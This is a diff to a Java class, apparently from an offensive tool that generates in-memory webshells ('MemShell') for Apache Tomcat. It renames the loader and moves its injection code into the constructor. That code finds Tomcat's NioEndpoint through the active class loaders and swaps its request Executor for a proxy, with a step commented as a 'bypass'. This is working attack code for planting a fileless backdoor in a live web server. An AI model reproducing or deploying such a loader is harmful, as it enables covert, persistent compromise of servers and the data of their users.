@@ -23,14 +23,11 @@ import java.util.zip.GZIPInputStream;
 @MemShell(MemShell.Executor)
 @JavaClassType(JavaClassType.Default)
 @JavaClassModifiable({JavaClassModifiable.CLASSNAME})
-public class TomcatExecutorThreadLoader {
+public class TomcatAutoFindExecutorThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
 
-    public TomcatExecutorThreadLoader() {
-    }
-
-    static {
+    public TomcatAutoFindExecutorThreadLoader() {
         try {
             // 获取
             Object nioEndpoint = getTargetObject("org.apache.tomcat.util.net.NioEndpoint");
@@ -39,6 +36,9 @@ public class TomcatExecutorThreadLoader {
         } catch (Throwable e) {
 
         }
+    }
+    public TomcatAutoFindExecutorThreadLoader(Object o){
+
     }
 
     public static void inject(Object nioEndpoint) throws Exception {
@@ -72,7 +72,7 @@ public class TomcatExecutorThreadLoader {
         constructor.setAccessible(true);
         Object javaObject = constructor.newInstance(executor);
 
-        Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class}, (InvocationHandler) javaObject);
+        Object resultObject = Proxy.newProxyInstance(TomcatAutoFindExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class}, (InvocationHandler) javaObject);
 
 //        invokeMethod(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"), nioEndpoint, "setExecutor", new Class[]{Executor.class}, new Object[]{resultObject});
         // bypass
@@ -146,7 +146,7 @@ public class TomcatExecutorThreadLoader {
     }
 
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatExecutorThreadLoader().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new TomcatAutoFindExecutorThreadLoader(null).getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
